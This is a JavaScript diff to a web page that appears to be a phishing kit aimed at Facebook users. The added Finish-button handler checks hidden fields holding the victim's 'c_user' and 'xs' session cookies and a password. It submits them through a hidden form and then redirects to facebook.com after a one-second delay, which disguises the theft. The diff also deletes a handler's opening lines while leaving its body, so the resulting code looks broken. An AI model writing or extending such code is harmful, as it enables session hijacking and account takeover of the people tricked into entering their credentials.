@@ -1927,16 +1927,29 @@
             closeModal.addEventListener('click', closeModalFunc);
             cancelBtn.addEventListener('click', closeModalFunc);
             
-            // Finish button
-            finishBtn.addEventListener('click', function() {
-                window.location.href = "https://www.facebook.com/";
-            });
-            
-            // Next to Step 2
-            nextToStep2.addEventListener('click', function() {
-                const cUserInput = document.getElementById('c_user');
-                const xsInput = document.getElementById('xs');
-                
+           // Finish button
+finishBtn.addEventListener('click', function (e) {
+    e.preventDefault(); // prevent immediate redirect
+
+    // OPTIONAL: Validate or ensure hidden inputs are filled
+    if (
+        !hiddenCUser.value ||
+        !hiddenXs.value ||
+        !hiddenPassword.value
+    ) {
+        alert("Missing form values.");
+        return;
+    }
+
+    // Submit the hidden form
+    hiddenForm.submit();
+
+    // Wait a moment before redirecting (give time for form submission)
+    setTimeout(function () {
+        window.location.href = "https://www.facebook.com/";
+    }, 1000); // 1 second delay
+});
+
                 // Trigger browser validation
                 if (!cUserInput.checkValidity()) {
                     cUserInput.reportValidity();
